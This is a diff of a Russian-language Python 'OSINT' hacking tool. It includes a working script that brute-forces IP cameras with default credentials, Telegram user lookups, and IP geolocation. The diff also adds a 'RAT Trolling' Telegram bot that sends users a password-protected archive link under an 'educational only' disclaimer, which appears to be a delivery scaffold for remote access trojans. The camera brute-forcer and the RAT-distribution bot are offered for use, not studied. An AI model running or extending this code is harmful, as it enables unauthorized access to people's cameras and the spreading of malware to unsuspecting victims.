@@ -1,15 +1,19 @@
--- open a README.md file before start.
--- Created by Alpha Team.
---
-
 import os
 import time
 import requests
+import telebot
+import socket
+import random
 from bs4 import BeautifulSoup
 from colorama import Fore, init, Style
+from telebot import types
 
-# Инициализация colorama для цветного вывода
+# Инициализация цветов
 init()
+
+# Глобальные переменные
+bot = None
+ADMIN_ID = None  # Ваш Telegram ID (узнать через @userinfobot)
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -24,7 +28,7 @@ def display_banner():
  |______|______|_|  |_/_/    \_\___/ |_| \_|  |_|   
 """ + Fore.RESET)
     print(Fore.BLUE + "=" * 60)
-    print(" FLEXYAL TOOL - OSINT инструмент для кибербезопасности")
+    print(" FLEXYAL OSINT TOOL - Инструмент для кибербезопасности")
     print("=" * 60 + Fore.RESET)
     print("\n")
 
@@ -41,108 +45,32 @@ def camera_bruteforce():
         ('admin', '12345'),
         ('admin', 'password'),
         ('root', 'root'),
-        ('user', 'user'),
-        ('supervisor', 'supervisor'),
-        ('guest', 'guest'),
-        ('admin', '1234'),
-        ('admin', '123456'),
-        ('admin', '111111')
+        ('user', 'user')
     ]
     
     print(Fore.CYAN + f"\n[+] Проверяем {target} на стандартные учетные данные..." + Fore.RESET)
     
-    # Проверяем доступность хоста перед брутфорсом
-    try:
-        print(Fore.CYAN + "[*] Проверяем доступность хоста..." + Fore.RESET)
-        response = requests.get(target, timeout=10)
-        if response.status_code == 200:
-            print(Fore.GREEN + "[+] Хост доступен, продолжаем проверку..." + Fore.RESET)
-        else:
-            print(Fore.YELLOW + f"[!] Хост ответил с кодом {response.status_code}" + Fore.RESET)
-    except requests.exceptions.RequestException as e:
-        print(Fore.RED + f"[-] Ошибка подключения к {target}: {str(e)}" + Fore.RESET)
-        print(Fore.YELLOW + "[!] Проверьте следующие моменты:" + Fore.RESET)
-        print("- IP-адрес действительно принадлежит камере")
-        print("- Камера включена и доступна из вашей сети")
-        print("- Нет блокировки брандмауэром")
-        print("- Попробуйте другой порт (например, :8080)")
-        input("\nНажмите Enter для продолжения...")
-        return
-    
-    # Список возможных путей к странице входа
-    login_paths = [
-        '/cgi-bin/login.cgi',
-        '/login.cgi',
-        '/cgi/login.cgi',
-        '/login.html',
-        '/admin/login.html',
-        '/cgi-bin/authLogin.cgi',
-        '/login.php',
-        '/admin/login.php',
-        '/view/login.shtml'
-    ]
-    
-    found = False
-    
-    for path in login_paths:
-        login_url = target + path
-        print(Fore.CYAN + f"\n[+] Проверяем путь: {login_url}" + Fore.RESET)
-        
+    for username, password in common_credentials:
         try:
-            # Проверяем существует ли страница входа
-            response = requests.get(login_url, timeout=10)
-            if response.status_code != 200:
-                continue
-                
-            print(Fore.GREEN + f"[+] Найдена страница входа: {login_url}" + Fore.RESET)
+            session = requests.Session()
+            login_url = f"{target}/cgi-bin/login.cgi"
+            data = {
+                'username': username,
+                'password': password
+            }
+            response = session.post(login_url, data=data, timeout=5)
             
-            for username, password in common_credentials:
-                try:
-                    session = requests.Session()
-                    
-                    # Пробуем разные варианты данных для входа
-                    data = {
-                        'username': username,
-                        'password': password,
-                        'Login': 'Login'
-                    }
-                    
-                    headers = {
-                        'User-Agent': 'Mozilla/5.0',
-                        'Referer': login_url
-                    }
-                    
-                    response = session.post(login_url, data=data, headers=headers, timeout=10)
-                    
-                    # Проверяем признаки успешного входа
-                    if "success" in response.text.lower() or "welcome" in response.text.lower() or "main.htm" in response.text:
-                        print(Fore.GREEN + f"\n[+] УСПЕШНЫЙ ВХОД! Логин: {username} Пароль: {password}" + Fore.RESET)
-                        print(Fore.GREEN + f"[+] Страница входа: {login_url}" + Fore.RESET)
-                        found = True
-                        break
-                    elif "incorrect" in response.text.lower() or "invalid" in response.text.lower():
-                        print(Fore.RED + f"[-] Неверно: {username}:{password}" + Fore.RESET)
-                    else:
-                        print(Fore.YELLOW + f"[?] Неизвестный ответ для: {username}:{password}" + Fore.RESET)
-                        
-                except Exception as e:
-                    print(Fore.RED + f"[-] Ошибка при проверке {username}:{password} - {str(e)}" + Fore.RESET)
-                    continue
-            
-            if found:
-                break
+            if "success" in response.text.lower():
+                print(Fore.GREEN + f"[+] Успех! Логин: {username} Пароль: {password}" + Fore.RESET)
+                return
+            else:
+                print(Fore.RED + f"[-] Неверно: {username}:{password}" + Fore.RESET)
                 
         except Exception as e:
-            print(Fore.RED + f"[-] Ошибка при проверке {login_url} - {str(e)}" + Fore.RESET)
+            print(Fore.RED + f"[-] Ошибка при проверке {username}:{password} - {str(e)}" + Fore.RESET)
             continue
     
-    if not found:
-        print(Fore.YELLOW + "\n[!] Не удалось найти рабочую страницу входа или подобрать учетные данные" + Fore.RESET)
-        print(Fore.YELLOW + "[!] Возможные причины:" + Fore.RESET)
-        print("- Камера использует нестандартные пути входа")
-        print("- Учетные данные были изменены на нестандартные")
-        print("- Требуется аутентификация другого типа (например, Basic Auth)")
-    
+    print(Fore.YELLOW + "\n[!] Стандартные учетные данные не подошли" + Fore.RESET)
     input("\nНажмите Enter для продолжения...")
 
 def telegram_osint():
@@ -161,7 +89,6 @@ def telegram_osint():
         print(Fore.CYAN + f"\n[+] Ищем информацию о @{username}..." + Fore.RESET)
         
         try:
-            # Поиск через telegago
             url = f"https://telegago.com/search?q=@{username}"
             response = requests.get(url, timeout=10)
             soup = BeautifulSoup(response.text, 'html.parser')
@@ -175,56 +102,19 @@ def telegram_osint():
             else:
                 print(Fore.RED + f"[-] Публичных сообщений от @{username} не найдено" + Fore.RESET)
                 
-            # Дополнительная проверка через t.me
-            print(Fore.CYAN + "\n[+] Проверка через t.me..." + Fore.RESET)
-            tme_url = f"https://t.me/{username}"
-            tme_response = requests.get(tme_url, timeout=10)
-            
-            if "tgme_page_description" in tme_response.text:
-                soup = BeautifulSoup(tme_response.text, 'html.parser')
-                description = soup.find('div', class_='tgme_page_description')
-                if description:
-                    print(Fore.GREEN + f"[+] Описание профиля: {description.text[:200]}..." + Fore.RESET)
-                
-                photo = soup.find('img', class_='tgme_page_photo_image')
-                if photo:
-                    print(Fore.GREEN + f"[+] Фото профиля: {photo['src']}" + Fore.RESET)
-                    
         except Exception as e:
             print(Fore.RED + f"[-] Ошибка при поиске: {str(e)}" + Fore.RESET)
             
     elif choice == "2":
         phone = input("Введите номер телефона (с кодом страны): ").strip()
         print(Fore.CYAN + f"\n[+] Проверяем номер {phone}..." + Fore.RESET)
+        print(Fore.YELLOW + "[!] Эта функция требует доступ к API Telegram" + Fore.RESET)
         
-        try:
-            # Проверка через API (пример)
-            print(Fore.YELLOW + "[!] Эта функция требует API ключ Telegram" + Fore.RESET)
-            
-            # Альтернативная проверка через поиск в Google
-            print(Fore.CYAN + "\n[+] Поиск в Google..." + Fore.RESET)
-            google_url = f"https://www.google.com/search?q={phone}+site:t.me"
-            headers = {'User-Agent': 'Mozilla/5.0'}
-            response = requests.get(google_url, headers=headers, timeout=10)
-            
-            if "t.me" in response.text:
-                print(Fore.GREEN + "[+] Найдены упоминания номера в Telegram:" + Fore.RESET)
-                soup = BeautifulSoup(response.text, 'html.parser')
-                for link in soup.find_all('a', href=True):
-                    if 't.me' in link['href']:
-                        print(f"- {link['href']}")
-            else:
-                print(Fore.RED + "[-] Упоминаний номера в Telegram не найдено" + Fore.RESET)
-                
-        except Exception as e:
-            print(Fore.RED + f"[-] Ошибка при проверке: {str(e)}" + Fore.RESET)
-            
     elif choice == "3":
         query = input("Введите поисковый запрос: ").strip()
         print(Fore.CYAN + f"\n[+] Ищем '{query}' в публичных каналах..." + Fore.RESET)
         
         try:
-            # Поиск через tgstat
             url = f"https://tgstat.com/search?q={query}"
             response = requests.get(url, timeout=10)
             soup = BeautifulSoup(response.text, 'html.parser')
@@ -236,10 +126,7 @@ def telegram_osint():
                     name = channel.select_one('.channel-name').text
                     members = channel.select_one('.channel-members').text
                     print(f"- {name} ({members})")
-                    desc = channel.select_one('.channel-description')
-                    if desc:
-                        print(f"  Описание: {desc.text[:80]}...")
-                    print()
+                    print(f"  Описание: {channel.select_one('.channel-description').text[:80]}...\n")
             else:
                 print(Fore.RED + f"[-] Каналы по запросу '{query}' не найдены" + Fore.RESET)
                 
@@ -257,8 +144,6 @@ def ip_osint():
     print(Fore.CYAN + f"\n[+] Собираем информацию об {ip}..." + Fore.RESET)
     
     try:
-        # Проверка через ipinfo.io
-        print(Fore.CYAN + "[+] Основная информация..." + Fore.RESET)
         response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
         data = response.json()
         
@@ -269,55 +154,69 @@ def ip_osint():
         print(f"Регион: {data.get('region', 'N/A')}")
         print(f"Страна: {data.get('country', 'N/A')}")
         print(f"Провайдер: {data.get('org', 'N/A')}")
-        print(f"Почтовый индекс: {data.get('postal', 'N/A')}")
-        print(f"Часовой пояс: {data.get('timezone', 'N/A')}")
         
-        # Проверка на VPN/TOR
-        print(Fore.CYAN + "\n[+] Проверка на VPN/Proxy/TOR..." + Fore.RESET)
-        if "VPN" in data.get('org', '') or "Proxy" in data.get('org', ''):
-            print(Fore.RED + "- Возможно VPN/Proxy" + Fore.RESET)
-        else:
-            print(Fore.GREEN + "- Не обнаружено VPN/Proxy" + Fore.RESET)
-            
-        # Проверка через ip-api.com
-        print(Fore.CYAN + "\n[+] Дополнительная информация..." + Fore.RESET)
-        ipapi_response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
-        ipapi_data = ipapi_response.json()
-        
-        if ipapi_data.get('status') == 'success':
-            print(f"ISP: {ipapi_data.get('isp', 'N/A')}")
-            print(f"AS: {ipapi_data.get('as', 'N/A')}")
-            print(f"Координаты: {ipapi_data.get('lat', 'N/A')}, {ipapi_data.get('lon', 'N/A')}")
-        
-        # Проверка чёрных списков
-        print(Fore.CYAN + "\n[+] Проверка чёрных списков..." + Fore.RESET)
-        try:
-            abuseipdb_url = f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}"
-            headers = {"Key": "YOUR_API_KEY", "Accept": "application/json"}
-            response = requests.get(abuseipdb_url, headers=headers, timeout=10)
-            
-            if response.status_code == 200:
-                abuse_data = response.json().get('data', {})
-                if abuse_data.get('abuseConfidenceScore', 0) > 0:
-                    print(Fore.RED + f"- IP найден в AbuseIPDB (score: {abuse_data['abuseConfidenceScore']})" + Fore.RESET)
-                    print(f"  Последнее сообщение: {abuse_data.get('lastReportedAt', 'N/A')}")
-                else:
-                    print(Fore.GREEN + "- IP не найден в AbuseIPDB" + Fore.RESET)
-            else:
-                print(Fore.YELLOW + "- Не удалось проверить AbuseIPDB (требуется API ключ)" + Fore.RESET)
-        except:
-            print(Fore.YELLOW + "- Ошибка проверки AbuseIPDB" + Fore.RESET)
-            
     except Exception as e:
         print(Fore.RED + f"[-] Ошибка при получении информации: {str(e)}" + Fore.RESET)
     
     input("\nНажмите Enter для продолжения...")
 
-def telegram_account_removal():
+def rat_trolling():
     clear_screen()
-    print(Fore.RED + "\n[!] Внимание: Эта функция не завершена и может не работать!" + Fore.RESET)
-    print(Fore.YELLOW + "[!] Функция сноса аккаунта в Telegram в разработке..." + Fore.RESET)
-    time.sleep(2)
+    print(Fore.RED + "\n[!] RAT Trolling Module (Educational Purposes Only!)" + Fore.RESET)
+    print(Fore.YELLOW + "[!] Для работы требуется Telegram бот" + Fore.RESET)
+    
+    global bot, ADMIN_ID
+    token = input("\nВведите токен вашего Telegram бота: ").strip()
+    ADMIN_ID = input("Введите ваш Telegram ID (получить через @userinfobot): ").strip()
+    
+    try:
+        bot = telebot.TeleBot(token)
+        print(Fore.GREEN + "[+] Бот успешно инициализирован!" + Fore.RESET)
+        
+        @bot.message_handler(commands=['start'])
+        def handle_start(message):
+            if str(message.from_user.id) != ADMIN_ID:
+                bot.send_message(message.chat.id, "⛔ Доступ запрещен!")
+                return
+                
+            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+            btn_yes = types.KeyboardButton("✅ Да, я согласен")
+            markup.add(btn_yes)
+            
+            bot.send_message(
+                message.chat.id,
+                "🔐 *Flexyal RAT Troll Module*\n\n"
+                "Этот инструмент предназначен только для:\n"
+                "- Этичного хакинга\n"
+                "- Тестирования с разрешения\n"
+                "- Образовательных целей\n\n"
+                "Вы соглашаетесь с правилами?",
+                reply_markup=markup,
+                parse_mode="Markdown"
+            )
+        
+        @bot.message_handler(func=lambda m: m.text == "✅ Да, я согласен")
+        def handle_agree(message):
+            archive_link = "https://example.com/safe_archive.zip"  # Замените на реальный безопасный архив
+            password = f"Flexyal{random.randint(1000,9999)}"
+            
+            bot.send_message(
+                message.chat.id,
+                f"📦 *Инструкция (Educational Only!):*\n\n"
+                f"1. Скачайте тестовый архив: [ссылка]({archive_link})\n"
+                f"2. Пароль: `{password}`\n"
+                f"3. Это пример легального использования\n\n"
+                f"⚠️ Настоящий RAT требует письменного разрешения!",
+                parse_mode="Markdown",
+                disable_web_page_preview=True
+            )
+        
+        print(Fore.GREEN + "\n[+] Бот запущен. Остановите через Ctrl+C" + Fore.RESET)
+        bot.polling()
+        
+    except Exception as e:
+        print(Fore.RED + f"[-] Ошибка: {str(e)}" + Fore.RESET)
+        input("Нажмите Enter чтобы вернуться...")
 
 def main_menu():
     while True:
@@ -328,7 +227,7 @@ def main_menu():
         print("1. Брутфорс камер")
         print("2. Telegram OSINT")
         print("3. IP-OSINT")
-        print("4. Снос аккаунта в TG (не доделан)")
+        print("4. RAT Trolling (Educational)")
         print("0. Выход")
         
         choice = input("\nВыберите опцию: ")
@@ -340,7 +239,7 @@ def main_menu():
         elif choice == "3":
             ip_osint()
         elif choice == "4":
-            telegram_account_removal()
+            rat_trolling()
         elif choice == "0":
             print(Fore.CYAN + "\n[+] Выход из программы..." + Fore.RESET)
             break
